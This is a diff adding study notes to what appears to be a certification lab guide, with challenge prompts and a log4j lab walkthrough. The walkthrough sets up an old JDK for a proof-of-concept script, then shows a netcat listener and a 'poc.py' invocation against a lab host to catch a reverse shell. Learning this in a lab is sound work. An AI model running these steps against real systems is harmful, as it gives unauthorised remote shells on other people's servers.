@@ -170,3 +170,31 @@ Perform command injection attack on 10.10.10.25 and find out how many user accou
 **Challenge 15:**
 
 You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)
+
+#Module 14 Hacking Web Applications - Lab2 - log4j#
+
+```
+tar -xf jdk-8u202-linux-x64.tar.gz
+
+mv jdk1.8.0_202 /usr/bin
+```
+
+Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
+
+Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+
+Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
+
+```
+nc -lvp 9001
+```
+
+```
+python3 poc.py --userip 10.10.1.10 --webport 8080 --lport 9001
+```
+![Screenshot 2024-12-12 at 5 20 06 PM](https://github.com/user-attachments/assets/174c008c-2053-4724-bde2-35a5140400f5)
+
+![image](https://github.com/user-attachments/assets/e8a9db4c-e79c-4989-bedc-e37fdf5bf2d9)
+
+![Screenshot 2024-12-12 at 5 19 33 PM](https://github.com/user-attachments/assets/ab3d11cf-4f9d-41bb-817b-1ae712d5aef4)
+
